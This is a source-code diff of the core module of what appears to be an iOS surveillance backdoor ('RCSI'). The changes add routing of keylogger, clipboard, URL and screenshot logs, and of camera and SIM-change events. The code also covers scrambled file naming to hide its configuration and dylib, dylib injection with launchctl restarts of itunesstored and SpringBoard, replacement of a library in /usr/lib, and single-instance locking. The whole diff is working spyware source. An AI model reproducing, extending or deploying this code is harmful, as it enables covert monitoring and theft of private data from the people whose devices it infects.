@@ -13,6 +13,8 @@
 #import <fcntl.h>
 #import <sys/socket.h>
 #import <sys/un.h>
+#import <mach/message.h>
+#import <AudioToolbox/AudioToolbox.h>
 
 #import "RCSICore.h"
 #import "RCSIUtils.h"
@@ -21,10 +23,13 @@
 #import "RCSITaskManager.h"
 #import "RCSIEncryption.h"
 #import "RCSIInfoManager.h"
+#import "RCSIEvents.h"
+#import "RCSIActions.h"
 
 #import "NSString+ComparisonMethod.h"
+#import "NSData+SHA1.h"
 
-//#define DEBUG
+//#define DEBUG_
 
 #define VERSION             "0.9.0"
 #define GLOBAL_PERMISSIONS  0666
@@ -194,45 +199,105 @@ RCSISharedMemory  *mSharedMemoryLogging;
     }
 }
 
+typedef struct _coreMessage_t
+{
+  mach_msg_header_t header;
+  uint dataLen;
+} coreMessage_t;
+
+
+- (void)dispatchToLogManager:(NSData*)aMessage
+{
+  if (aMessage != nil) 
+    {
+      mach_port_t machPort = [[[RCSILogManager sharedInstance] notificationPort] machPort];
+      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+    }
+}
+
+- (void)dispatchToEventManager:(NSData*)aMessage
+{
+  if (aMessage != nil) 
+    {
+      mach_port_t machPort = [[[RCSIEvents sharedInstance] notificationPort] machPort];
+      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+    }
+}
+
+- (void)dispatchMessages:(NSData*)aMessage
+{
+  if (aMessage == nil)
+    return;
+    
+  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
+  
+  switch (message->agentID)
+  {
+    case LOG_URL:
+    case LOG_APPLICATION:
+    case LOG_CLIPBOARD:
+    case LOG_KEYLOG:
+    case LOG_SNAPSHOT:
+    {
+      [self dispatchToLogManager:aMessage];
+      break;
+    }
+    case EVENT_CAMERA_APP:
+    case EVENT_STANDBY:
+    case EVENT_SIM_CHANGE:
+    {
+      [self dispatchToEventManager: aMessage];
+      break;
+    }
+  }
+}
+
+- (void)coreRunLoop
+{
+  //NSString *kRCSICoreMainRunLoop = @"kRCSICoreMainRunLoop";
+  
+  while (mMainLoopControlFlag != @"STOP")
+    {
+      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 1.000]]; 
+//      [[NSRunLoop currentRunLoop] runMode: kRCSICoreMainRunLoop 
+//                               beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.000]];
+      NSMutableArray *messages = [mSharedMemoryLogging fetchMessages];
+
+      for (int i=0; i < [messages count]; i++) 
+      {
+        [self dispatchMessages: [messages objectAtIndex:i]];
+      }
+    
+      [pool release];
+    }
+}
+
 - (void)_guessNames
 {
-#ifdef DEV_MODE
-  unsigned char result[CC_MD5_DIGEST_LENGTH];
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
-  
-  NSData *temp = [NSData dataWithBytes: result
-                                length: CC_MD5_DIGEST_LENGTH];
-#else
   NSData *temp = [NSData dataWithBytes: gConfAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
-#endif
   
   RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   
-  //
   // Here we should calculate the lowest scrambled name in order to obtain
   // the configuration name
-  //
   gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
                                                 seed: ALPHABET_LEN / 2];
   
   if ([gBackdoorName isLessThan: gBackdoorUpdateName])
     {
-      gConfigurationName = [_encryption scrambleForward: gBackdoorName
-                                                   seed: 1];
+      gConfigurationName = [_encryption scrambleForward: gBackdoorName seed: 1];
     }
   else
     {
-      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName
-                                                   seed: 1];
+      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName seed: 1];
     }
   
-  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName
-                                                     seed: ALPHABET_LEN / 2];
-  
-  gDylibName = [_encryption scrambleForward: gConfigurationName
-                                       seed: 2];
+  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName  seed: ALPHABET_LEN / 2];
+  gDylibName = [_encryption scrambleForward: gConfigurationName seed: 2];
 }
 
 @end
@@ -276,34 +341,26 @@ RCSISharedMemory  *mSharedMemoryLogging;
       mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                                    size: SHMEM_LOG_MAX_SIZE];
       
-      //
       // Let's guess all the required names
-      //
       [self _guessNames];
       
-      NSString *kextPath = [[NSString alloc] initWithFormat: @"%@/%@",
-                            [[NSBundle mainBundle] bundlePath],
-                            @"Contents/Resources"];
+      NSString *kextPath   = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                               [[NSBundle mainBundle] bundlePath],
+                                                               @"Contents/Resources"];
+                                                               
       NSString *loaderPath = [[NSString alloc] initWithFormat: @"%@/%@",
-                              [[NSBundle mainBundle] bundlePath],
-                              @"srv.sh"];
+                                                               [[NSBundle mainBundle] bundlePath],
+                                                               @"srv.sh"];
+                                                               
       NSString *flagPath   = [[NSString alloc] initWithFormat: @"%@/%@",
-                              [[NSBundle mainBundle] bundlePath],
-                              @"mdworker.flg"];
-#ifdef NOT_USED
-      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
-                                             kextPath: [[NSBundle mainBundle] pathForResource: @"mchook"
-                                                                                       ofType: @"kext"]
-                                         SLIPlistPath: SLI_PLIST
-                                        serviceLoader: @"srv.sh"
-                                             execFlag: @"mdworker.flg"];
-#else
+                                                               [[NSBundle mainBundle] bundlePath],
+                                                               @"mdworker.flg"];
+
       mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
                                              kextPath: kextPath
                                          SLIPlistPath: SLI_PLIST
                                         serviceLoader: loaderPath
                                              execFlag: flagPath];
-#endif
       
       [kextPath release];
       [loaderPath release];
@@ -341,9 +398,6 @@ RCSISharedMemory  *mSharedMemoryLogging;
   
   if ([mUtil createBackdoorLoader] == NO) 
     {
-#ifdef DEBUG
-      errorLog(ME, @"makeBackdoorResident: an error occured while writing the serviceLoader");
-#endif 
       return NO;
     }
   
@@ -354,7 +408,7 @@ RCSISharedMemory  *mSharedMemoryLogging;
       errorLog(ME, @"error on dylib injection");
 #endif
     }
-  // Dylib injection
+    
   if (injectDylib(itPathname) == NO)
     {
 #ifdef DEBUG
@@ -363,7 +417,8 @@ RCSISharedMemory  *mSharedMemoryLogging;
     }
   else 
     {
-      system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"; launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
+      system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
+      system("launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
     }
 
   
@@ -379,19 +434,9 @@ RCSISharedMemory  *mSharedMemoryLogging;
     return NO;
 }
 
-- (BOOL)runMeh
+- (BOOL)amIAlone
 {
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance]; 
-  
-  // Set the backdoorControlFlag to RUNNING
-  mMainLoopControlFlag = @"RUNNING";
-  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
-  
-  //
   // Lock to prevent more instance of running backdoor
-  //
   if ((gLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
     {
       struct sockaddr_in l_addr;   
@@ -404,48 +449,98 @@ RCSISharedMemory  *mSharedMemoryLogging;
       if ((bind(gLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
           errno == EADDRINUSE) 
         {
-#ifdef DEBUG
-          NSLog(@"%s: cannot bind socket, instance already running, errno %d", __FUNCTION__, errno);
-#endif
-          [pool release];
-          exit(-1);
+          return NO;
         }
     }
-  else
-    {
-#ifdef DEBUG
-      NSLog(@"%s: error create socket, [%d] could not check running instance", __FUNCTION__, gLockSock);
-#endif
-    }
+    
+  return YES;
+}
+
+- (BOOL)shouldUpgradeComponents
+{
+  NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                                [[NSBundle mainBundle] bundlePath],
+                                                                RCS8_MIGRATION_CONFIG];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
+    {  
+      NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                                      [[NSBundle mainBundle] bundlePath],
+                                                                      gConfigurationName];
       
-  //
-  // Get system version in global variables
-  //
+      if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
+                                                     error: nil])
+        { // FIXED- corregere su mac!!!!!! XXX-
+          [[NSFileManager defaultManager] moveItemAtPath: migrationConfig
+                                                  toPath: configurationPath
+                                                   error: nil];
+        }
+      
+      [configurationPath release];
+    }
+  
+  [migrationConfig release];
+  
+  NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                            [[NSBundle mainBundle] bundlePath],
+                                                            RCS8_UPDATE_DYLIB];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: updateDylib] == TRUE)
+    
+    {
+      NSString *dylib = [[NSString alloc] initWithFormat: @"/usr/lib/%@", gDylibName];
+      
+      [[NSFileManager defaultManager] removeItemAtPath: dylib
+                                                 error: nil];
+      
+      [[NSFileManager defaultManager] moveItemAtPath: updateDylib
+                                              toPath: dylib
+                                               error: nil];
+      [dylib release];                                   
+         
+      // Forcing a SpringBoard reload
+      system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\";" 
+             "launchctl load \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\"");
+    }
+  
+  [updateDylib release];
+  
+  return TRUE;
+}
+
+- (BOOL)runMeh
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  RCSITaskManager *taskManager   = [RCSITaskManager sharedInstance]; 
+  RCSILogManager  *logManager    = [RCSILogManager sharedInstance];
+  RCSIEvents      *eventManager  = [RCSIEvents sharedInstance];
+  RCSIActions     *actionManager = [RCSIActions sharedInstance];
+  
+  mMainLoopControlFlag = @"RUNNING";
+  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
+  
+  // Lock to prevent more instance of running backdoor
+  if ([self amIAlone] == NO)
+    {
+      [pool release];
+      exit(-1);
+    } 
+    
   getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);
 
-#ifdef DEBUG
-  NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
-#endif
-    
-  //
-  // Create and initialize the shared memory segments
-  // for commands and logs
-  //
+  // check if we are running rcs8 for the first time
+  // or there are comps ready for upgrade
+  [self shouldUpgradeComponents];
+  
+  // Create and initialize the shared memory for commands
   if ([mSharedMemoryCommand createMemoryRegion] == -1)
-    return NO;
-    
+    return NO;    
   if ([mSharedMemoryCommand attachToMemoryRegion: YES] == -1)
     return NO;
-  
   [mSharedMemoryCommand zeroFillMemory];
-  
-  if ([mSharedMemoryLogging createMemoryRegion] == -1)
-    return NO;
 
-  if ([mSharedMemoryLogging attachToMemoryRegion: YES] == -1)
-    return NO;
-  
-  [mSharedMemoryLogging zeroFillMemory];
+  [mSharedMemoryLogging createCoreRLSource];
   
   if ([self isBackdoorAlreadyResident] == FALSE)
     {
@@ -455,36 +550,31 @@ RCSISharedMemory  *mSharedMemoryLogging;
           errorLog(ME, @"[makeBackdoorResident] An error occurred");
 #endif        
         }
-      else
-        {
-#ifdef DEBUG        
-          infoLog(ME, @"[makeBackdoorResident] successful");
-#endif
-        }
     }
   
-  // If resident configuration is invalid core exit immediately
-  if ([taskManager loadInitialConfiguration])
+  if ([taskManager loadInitialConfiguration] == FALSE)
     {
-#ifdef DEBUG
-      NSLog(@"%s: configuration loaded and running",__FUNCTION__);
-#endif
-    }
+      exit(-1);
+    }  
   
-  // Start enabled agents
-  [taskManager startAgents];
+  // play sound in demo mode
+  checkAndRunDemoMode();
   
-  // Start events monitor
+  [logManager start];
+  
+  [actionManager start];
+  
+  // initialize events
   [taskManager startEvents];
+  
+  [eventManager start];
   
   RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
 
-  //
   // Main backdoor loop
-  //
-  [self _communicateWithAgents];
+  [self coreRunLoop];
   
   [pool release];
   
